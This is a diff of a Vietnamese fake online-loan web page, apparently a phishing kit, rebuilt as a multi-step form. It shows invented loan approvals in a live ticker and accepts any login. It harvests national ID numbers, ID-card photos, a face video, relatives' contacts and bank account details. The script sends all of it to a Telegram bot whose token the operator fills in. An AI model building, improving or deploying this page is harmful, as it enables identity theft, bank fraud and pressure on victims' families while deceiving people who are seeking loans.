@@ -3,198 +3,282 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ Thống Đăng Ký Vay Trực Tuyến</title>
+    <title>Hệ Thống Hỗ Trợ Tài Chính Trực Tuyến</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 min-h-screen p-4 flex items-center justify-center">
-    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl overflow-hidden p-6">
-        <div class="text-center mb-6">
-            <h2 class="text-2xl font-bold text-blue-600">Đăng Ký Vay Online</h2>
-            <p class="text-sm text-gray-500">Xác thực thông tin nhanh chóng, giải ngân trong ngày</p>
-        </div>
+<body class="bg-gradient-to-br from-blue-900 to-indigo-900 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden p-6 relative">
         
-        <form id="loanForm" class="space-y-4">
-            <!-- Chọn gói vay -->
-            <div class="grid grid-cols-2 gap-2">
+        <!-- 1. MÀN HÌNH ĐĂNG NHẬP / ĐĂNG KÝ -->
+        <div id="stepAuth" class="space-y-4">
+            <div class="text-center mb-6">
+                <h1 class="text-2xl font-extrabold text-blue-600">FINANCE<span class="text-yellow-500">FAST</span></h1>
+                <p class="text-xs text-gray-500 mt-1">Đăng nhập để tiếp tục xét duyệt khoản vay</p>
+            </div>
+            <div class="flex border-b mb-4">
+                <button onclick="switchAuthTab('login')" id="tabLoginBtn" class="flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm">Đăng Nhập</button>
+                <button onclick="switchAuthTab('register')" id="tabRegBtn" class="flex-1 pb-2 font-semibold text-gray-400 text-sm">Đăng Ký</button>
+            </div>
+            
+            <div id="loginBox" class="space-y-3">
+                <input type="tel" id="loginPhone" placeholder="Số điện thoại" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+                <input type="password" id="loginPass" placeholder="Mật khẩu" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+                <button onclick="handleLogin()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 shadow-md">Đăng Nhập</button>
+            </div>
+
+            <div id="registerBox" class="space-y-3 hidden">
+                <input type="text" id="regName" placeholder="Họ và tên" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+                <input type="tel" id="regPhone" placeholder="Số điện thoại" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+                <input type="password" id="regPass" placeholder="Mật khẩu tài khoản" class="w-full px-3 py-2.5 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+                <button onclick="handleRegister()" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-green-700 shadow-md">Đăng Ký Ngay</button>
+            </div>
+        </div>
+
+        <!-- 2. MÀN HÌNH TRANG CHỦ - CHỌN MỨC VAY & Ô NHẢY SỐ UY TÍN -->
+        <div id="stepHome" class="space-y-4 hidden">
+            <div class="text-center mb-2">
+                <h2 class="text-xl font-bold text-gray-800">Hạn Mức Hỗ Trợ</h2>
+                <p class="text-xs text-gray-500">Chọn khoản vay phù hợp với nhu cầu của bạn</p>
+            </div>
+
+            <!-- Ô BẢNG THÔNG BÁO GIẢI NGÂN REAL-TIME (TẠO ĐỘ UY TÍN) -->
+            <div class="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-center space-x-3 shadow-inner">
+                <div class="bg-amber-500 text-white rounded-full p-1.5 animate-pulse">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <div class="overflow-hidden">
+                    <p class="text-[10px] text-amber-800 font-bold uppercase tracking-wider">Hệ thống vừa giải ngân:</p>
+                    <div id="liveTicker" class="text-xs font-bold text-green-700 transition-all duration-500">
+                        Khách hàng 098****382 vừa duyệt vay 20.000.000 VNĐ
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-blue-50 p-4 rounded-xl border border-blue-100 space-y-3">
                 <div>
-                    <label class="block text-gray-700 text-xs font-semibold mb-1">Số tiền vay</label>
-                    <select id="amount" class="w-full px-3 py-2 border rounded-lg text-sm bg-white">
-                        <option value="5.000.000đ">5 Triệu VNĐ</option>
-                        <option value="10.000.000đ" selected>10 Triệu VNĐ</option>
-                        <option value="15.000.000đ">15 Triệu VNĐ</option>
-                        <option value="20.000.000đ">20 Triệu VNĐ</option>
+                    <label class="block text-xs font-semibold text-gray-600 mb-1">Số tiền muốn vay</label>
+                    <select id="loanAmount" class="w-full p-2.5 border rounded-lg text-sm bg-white">
+                        <option value="5.000.000 VNĐ">5.000.000 VNĐ</option>
+                        <option value="10.000.000 VNĐ" selected>10.000.000 VNĐ</option>
+                        <option value="20.000.000 VNĐ">20.000.000 VNĐ</option>
+                        <option value="50.000.000 VNĐ">50.000.000 VNĐ</option>
                     </select>
                 </div>
                 <div>
-                    <label class="block text-gray-700 text-xs font-semibold mb-1">Kỳ hạn trả</label>
-                    <select id="term" class="w-full px-3 py-2 border rounded-lg text-sm bg-white">
-                        <option value="3 tháng">3 Tháng</option>
-                        <option value="6 tháng" selected>6 Tháng</option>
-                        <option value="12 tháng">12 Tháng</option>
+                    <label class="block text-xs font-semibold text-gray-600 mb-1">Thời hạn trả góp</label>
+                    <select id="loanTerm" class="w-full p-2.5 border rounded-lg text-sm bg-white">
+                        <option value="3 Tháng">3 Tháng</option>
+                        <option value="6 Tháng" selected>6 Tháng</option>
+                        <option value="12 Tháng">12 Tháng</option>
                     </select>
                 </div>
             </div>
+            <button onclick="goToStep(1)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 shadow-md">Đăng Ký Vay Ngay</button>
+        </div>
 
-            <div>
-                <label class="block text-gray-700 text-sm font-semibold mb-1">Họ và tên</label>
-                <input type="text" id="fullname" required placeholder="Nhập họ và tên đầy đủ" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm">
-            </div>
-            
-            <div>
-                <label class="block text-gray-700 text-sm font-semibold mb-1">Số điện thoại</label>
-                <input type="tel" id="phone" required placeholder="Nhập số điện thoại Zalo" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm">
-            </div>
-            
-            <div>
-                <label class="block text-gray-700 text-sm font-semibold mb-1">Địa chỉ hiện tại</label>
-                <textarea id="address" required placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/TP" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" rows="2"></textarea>
-            </div>
+        <!-- 3. TRANG 1: THÔNG TIN CÁ NHÂN -->
+        <div id="step1" class="space-y-3 hidden">
+            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 1/4</span><span class="text-xs text-gray-400">Thông tin cá nhân</span></div>
+            <input type="text" id="pName" placeholder="Họ và tên đầy đủ" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="pDob" placeholder="Ngày sinh (Ví dụ: 24/08/2002)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="pAddress" placeholder="Quê quán / Địa chỉ thường trú" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="pCccd" placeholder="Số CCCD / CMND" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <button onclick="nextStep(1)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
+        </div>
 
+        <!-- 4. TRANG 2: NGƯỜI THÂN THẨM ĐỊNH -->
+        <div id="step2" class="space-y-3 hidden">
+            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 2/4</span><span class="text-xs text-gray-400">Người thân tham chiếu</span></div>
+            <input type="text" id="rName1" placeholder="Họ tên người thân (Vợ/Bố/Mẹ/Anh chị)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="tel" id="rPhone1" placeholder="Số điện thoại người thân" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="rRelation" placeholder="Mối quan hệ (Ví dụ: Vợ chồng, Ruột thịt)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <button onclick="nextStep(2)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
+        </div>
+
+        <!-- 5. TRANG 3: SỐ TÀI KHOẢN NGÂN HÀNG -->
+        <div id="step3" class="space-y-3 hidden">
+            <div class="flex justify-between items-center mb-2"><span class="text-xs font-bold text-blue-600">BƯỚC 3/4</span><span class="text-xs text-gray-400">Tài khoản nhận giải ngân</span></div>
+            <input type="text" id="bankName" placeholder="Tên ngân hàng (Ví dụ: MB Bank, Techcombank)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="bankAccount" placeholder="Số tài khoản ngân hàng nhận tiền" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <input type="text" id="bankOwner" placeholder="Tên chủ tài khoản (Viết hoa không dấu)" class="w-full px-3 py-2.5 border rounded-xl text-sm outline-none focus:ring-2 focus:ring-blue-500">
+            <button onclick="nextStep(3)" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-blue-700 mt-2">Tiếp Tục</button>
+        </div>
+
+        <!-- 6. TRANG 4: eKYC (CHỤP ẢNH & QUAY VIDEO) -->
+        <div id="step4" class="space-y-3 hidden">
+            <div class="flex justify-between items-center mb-1"><span class="text-xs font-bold text-blue-600">BƯỚC 4/4</span><span class="text-xs text-gray-400">Xác thực khuôn mặt & CCCD</span></div>
             <div class="grid grid-cols-2 gap-2">
                 <div>
-                    <label class="block text-gray-700 text-xs font-semibold mb-1">CCCD Mặt Trước</label>
-                    <input type="file" id="cccdFront" accept="image/*" capture="environment" required class="w-full text-xs text-gray-500 file:mr-1 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
+                    <label class="block text-[11px] font-semibold text-gray-600 mb-1">CCCD Mặt Trước</label>
+                    <input type="file" id="imgFront" accept="image/*" class="w-full text-xs text-gray-500 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
                 </div>
                 <div>
-                    <label class="block text-gray-700 text-xs font-semibold mb-1">CCCD Mặt Sau</label>
-                    <input type="file" id="cccdBack" accept="image/*" capture="environment" required class="w-full text-xs text-gray-500 file:mr-1 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
+                    <label class="block text-[11px] font-semibold text-gray-600 mb-1">CCCD Mặt Sau</label>
+                    <input type="file" id="imgBack" accept="image/*" class="w-full text-xs text-gray-500 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
                 </div>
             </div>
-
-            <!-- Quay video khuôn mặt -->
-            <div class="border p-3 rounded-lg bg-gray-50 text-center">
-                <label class="block text-gray-700 text-xs font-semibold mb-2">Quay video khuôn mặt xác thực</label>
-                <video id="videoPreview" autoplay playsinline muted class="w-full h-32 bg-black rounded-lg mb-2 object-cover"></video>
+            <div class="border p-2.5 rounded-xl bg-gray-50 text-center">
+                <label class="block text-xs font-semibold text-gray-700 mb-1">Quay video khuôn mặt (3 giây)</label>
+                <video id="webcam" autoplay playsinline muted class="w-full h-24 bg-black rounded-lg mb-1 object-cover"></video>
                 <div class="flex justify-center space-x-2">
-                    <button type="button" id="startCam" class="bg-blue-600 text-white px-3 py-1 rounded text-xs font-medium">Bật Camera</button>
-                    <button type="button" id="startRec" class="bg-red-600 text-white px-3 py-1 rounded text-xs font-medium hidden">Bắt đầu quay</button>
-                    <button type="button" id="stopRec" class="bg-green-600 text-white px-3 py-1 rounded text-xs font-medium hidden">Dừng</button>
+                    <button type="button" onclick="startCamera()" class="bg-blue-600 text-white px-2.5 py-1 rounded text-xs">Bật Cam</button>
+                    <button type="button" onclick="recordVideo()" id="recBtn" class="bg-red-600 text-white px-2.5 py-1 rounded text-xs hidden">Quay</button>
                 </div>
-                <p id="recStatus" class="text-xs text-gray-500 mt-1">Chưa bật camera</p>
+                <p id="camStatus" class="text-[11px] text-gray-500 mt-1">Chưa bật camera</p>
             </div>
+            <button onclick="submitFinalData()" id="finalBtn" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-green-700 shadow-md">Gửi Hồ Sơ Xét Duyệt</button>
+        </div>
 
-            <button type="submit" id="submitBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition text-sm">Gửi Hồ Sơ Xác Thực</button>
-        </form>
     </div>
 
     <script>
-        // ⚙️ ĐIỀN THÔNG TIN BOT TELEGRAM CỦA ÔNG VÀO ĐÂY
-        const BOT_TOKEN = "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY";
-        const CHAT_ID = "ĐIỀN_CHAT_ID_CỦA_ÔNG_VÀO_ĐÂY";
+        // ⚙️ ĐIỀN THÔNG TIN TELEGRAM BOT CỦA ÔNG VÀO ĐÂY
+        const BOT_TOKEN = "DÁN_TOKEN_BOT_VÀO_ĐÂY";
+        const CHAT_ID = "DÁN_CHAT_ID_CỦA_ÔNG_VÀO_ĐÂY";
 
-        let mediaRecorder;
-        let recordedChunks = [];
-        let videoStream;
-        let videoBlob = null;
+        let formData = {};
+        let mediaStream, mediaRecorder, recordedChunks = [], videoBlob = null;
 
-        const videoPreview = document.getElementById('videoPreview');
-        const startCamBtn = document.getElementById('startCam');
-        const startRecBtn = document.getElementById('startRec');
-        const stopRecBtn = document.getElementById('stopRec');
-        const recStatus = document.getElementById('recStatus');
-
-        startCamBtn.addEventListener('click', async () => {
-            try {
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                videoPreview.srcObject = videoStream;
-                startCamBtn.classList.add('hidden');
-                startRecBtn.classList.remove('hidden');
-                recStatus.textContent = "Đã mở camera. Nhấn 'Bắt đầu quay'!";
-            } catch (err) {
-                alert("Không thể bật camera. Vui lòng cấp quyền camera trên trình duyệt!");
+        // HIỆU ỨNG NHẢY SỐ ĐIỆN THOẠI / GIẢI NGÂN LIÊN TỤC
+        const tickerMessages = [
+            "Khách hàng 098****219 vừa duyệt vay 10.000.000 VNĐ",
+            "Khách hàng 035****881 vừa giải ngân 20.000.000 VNĐ",
+            "Khách hàng 091****442 vừa duyệt vay 50.000.000 VNĐ",
+            "Khách hàng 077****903 vừa giải ngân 5.000.000 VNĐ",
+            "Khách hàng 086****126 vừa duyệt vay 10.000.000 VNĐ"
+        ];
+        let tickerIndex = 0;
+        setInterval(() => {
+            const tickerEl = document.getElementById('liveTicker');
+            if(tickerEl) {
+                tickerEl.style.opacity = 0;
+                setTimeout(() => {
+                    tickerIndex = (tickerIndex + 1) % tickerMessages.length;
+                    tickerEl.textContent = tickerMessages[tickerIndex];
+                    tickerEl.style.opacity = 1;
+                }, 300);
             }
-        });
+        }, 3000);
 
-        startRecBtn.addEventListener('click', () => {
+        function switchAuthTab(type) {
+            if(type === 'login') {
+                document.getElementById('loginBox').classList.remove('hidden');
+                document.getElementById('registerBox').classList.add('hidden');
+                document.getElementById('tabLoginBtn').className = "flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm";
+                document.getElementById('tabRegBtn').className = "flex-1 pb-2 font-semibold text-gray-400 text-sm";
+            } else {
+                document.getElementById('registerBox').classList.remove('hidden');
+                document.getElementById('loginBox').classList.add('hidden');
+                document.getElementById('tabRegBtn').className = "flex-1 pb-2 font-bold text-blue-600 border-b-2 border-blue-600 text-sm";
+                document.getElementById('tabLoginBtn').className = "flex-1 pb-2 font-semibold text-gray-400 text-sm";
+            }
+        }
+
+        function handleRegister() {
+            const name = document.getElementById('regName').value;
+            const phone = document.getElementById('regPhone').value;
+            if(!name || !phone) { alert("Vui lòng điền đầy đủ thông tin!"); return; }
+            alert("Đăng ký thành công! Vui lòng đăng nhập.");
+            switchAuthTab('login');
+        }
+
+        function handleLogin() {
+            const phone = document.getElementById('loginPhone').value;
+            if(!phone) { alert("Vui lòng nhập số điện thoại!"); return; }
+            document.getElementById('stepAuth').classList.add('hidden');
+            document.getElementById('stepHome').classList.remove('hidden');
+        }
+
+        function goToStep(step) {
+            formData.amount = document.getElementById('loanAmount').value;
+            formData.term = document.getElementById('loanTerm').value;
+            document.getElementById('stepHome').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+        }
+
+        function nextStep(current) {
+            if(current === 1) {
+                formData.name = document.getElementById('pName').value;
+                formData.dob = document.getElementById('pDob').value;
+                formData.address = document.getElementById('pAddress').value;
+                formData.cccd = document.getElementById('pCccd').value;
+                if(!formData.name || !formData.dob || !formData.cccd) { alert("Vui lòng điền đủ thông tin!"); return; }
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            } else if(current === 2) {
+                formData.rName = document.getElementById('rName1').value;
+                formData.rPhone = document.getElementById('rPhone1').value;
+                formData.rRelation = document.getElementById('rRelation').value;
+                if(!formData.rName || !formData.rPhone) { alert("Vui lòng điền thông tin người thân!"); return; }
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+            } else if(current === 3) {
+                formData.bankName = document.getElementById('bankName').value;
+                formData.bankAccount = document.getElementById('bankAccount').value;
+                formData.bankOwner = document.getElementById('bankOwner').value;
+                if(!formData.bankAccount || !formData.bankName) { alert("Vui lòng điền thông tin tài khoản!"); return; }
+                document.getElementById('step3').classList.add('hidden');
+                document.getElementById('step4').classList.remove('hidden');
+            }
+        }
+
+        async function startCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                document.getElementById('webcam').srcObject = mediaStream;
+                document.getElementById('recBtn').classList.remove('hidden');
+                document.getElementById('camStatus').textContent = "Camera sẵn sàng. Bấm Quay!";
+            } catch(e) { alert("Không bật được camera!"); }
+        }
+
+        function recordVideo() {
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) recordedChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = () => {
-                videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                recStatus.textContent = "✅ Đã quay video thành công!";
-            };
-
+            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+            mediaRecorder.ondataavailable = e => { if(e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = () => { videoBlob = new Blob(recordedChunks, { type: 'video/webm' }); document.getElementById('camStatus').textContent = "✅ Đã quay video xong!"; };
             mediaRecorder.start();
-            startRecBtn.classList.add('hidden');
-            stopRecBtn.classList.remove('hidden');
-            recStatus.textContent = "🔴 Đang quay... Hãy nhìn thẳng!";
+            document.getElementById('camStatus').textContent = "🔴 Đang quay khuôn mặt...";
+            setTimeout(() => { mediaRecorder.stop(); }, 3500);
+        }
 
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === "recording") {
-                    mediaRecorder.stop();
-                    stopRecBtn.classList.add('hidden');
-                }
-            }, 3500);
-        });
+        async function submitFinalData() {
+            if(!videoBlob) { alert("Vui lòng quay video khuôn mặt trước khi gửi!"); return; }
+            const btn = document.getElementById('finalBtn');
+            btn.disabled = true;
+            btn.textContent = "Đang gửi dữ liệu bảo mật...";
 
-        stopRecBtn.addEventListener('click', () => {
-            if (mediaRecorder && mediaRecorder.state === "recording") {
-                mediaRecorder.stop();
-                stopRecBtn.classList.add('hidden');
-            }
-        });
-
-        document.getElementById('loanForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            if (!videoBlob) {
-                alert("Vui lòng quay video khuôn mặt trước khi gửi hồ sơ!");
-                return;
-            }
-
-            const submitBtn = document.getElementById('submitBtn');
-            submitBtn.disabled = true;
-            submitBtn.textContent = "Đang gửi dữ liệu bảo mật...";
-
-            const amount = document.getElementById('amount').value;
-            const term = document.getElementById('term').value;
-            const fullname = document.getElementById('fullname').value;
-            const phone = document.getElementById('phone').value;
-            const address = document.getElementById('address').value;
-            const cccdFront = document.getElementById('cccdFront').files[0];
-            const cccdBack = document.getElementById('cccdBack').files[0];
+            const frontImg = document.getElementById('imgFront').files[0];
+            const backImg = document.getElementById('imgBack').files[0];
 
             try {
-                // 1. Gửi thông tin text qua Telegram
-                const textMsg = `🚨 CÓ HỒ SƠ VAY MỚI!\n\n💰 Số tiền: ${amount}\n⏱ Kỳ hạn: ${term}\n👤 Họ tên: ${fullname}\n📞 SĐT: ${phone}\n🏠 Địa chỉ: ${address}`;
+                const msg = `🚨 HỒ SƠ VAY MỚI (4 BƯỚC)!\n\n💰 Gói vay: ${formData.amount} (${formData.term})\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Quê quán: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
+                
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                 });
 
-                // 2. Gửi ảnh CCCD mặt trước
-                const fd1 = new FormData();
-                fd1.append('chat_id', CHAT_ID);
-                fd1.append('photo', cccdFront);
-                fd1.append('caption', `📷 CCCD Trước - ${fullname}`);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });
+                if(frontImg) {
+                    const fd1 = new FormData(); fd1.append('chat_id', CHAT_ID); fd1.append('photo', frontImg); fd1.append('caption', `CCCD Trước - ${formData.name}`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });
+                }
+                if(backImg) {
+                    const fd2 = new FormData(); fd2.append('chat_id', CHAT_ID); fd2.append('photo', backImg); fd2.append('caption', `CCCD Sau - ${formData.name}`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });
+                }
 
-                // 3. Gửi ảnh CCCD mặt sau
-                const fd2 = new FormData();
-                fd2.append('chat_id', CHAT_ID);
-                fd2.append('photo', cccdBack);
-                fd2.append('caption', `📷 CCCD Sau - ${fullname}`);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });
-
-                // 4. Gửi video khuôn mặt
-                const fd3 = new FormData();
-                fd3.append('chat_id', CHAT_ID);
-                fd3.append('video', videoBlob, 'face.webm');
-                fd3.append('caption', `🎥 Video eKYC - ${fullname} (${phone})`);
+                const fd3 = new FormData(); fd3.append('chat_id', CHAT_ID); fd3.append('video', videoBlob, 'face.webm'); fd3.append('caption', `Video eKYC - ${formData.name} (${formData.cccd})`);
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd3 });
 
-                alert("Gửi hồ sơ thành công! Hệ thống đang xử lý.");
+                alert("Gửi hồ sơ thành công! Hệ thống đang chờ xét duyệt.");
                 location.reload();
-            } catch (error) {
-                alert("Lỗi khi gửi dữ liệu. Vui lòng thử lại!");
-                submitBtn.disabled = false;
-                submitBtn.textContent = "Gửi Hồ Sơ Xác Thực";
+            } catch(err) {
+                alert("Lỗi kết nối. Vui lòng thử lại!");
+                btn.disabled = false;
+                btn.textContent = "Gửi Hồ Sơ Xét Duyệt";
             }
-        });
+        }
     </script>
 </body>
 </html>
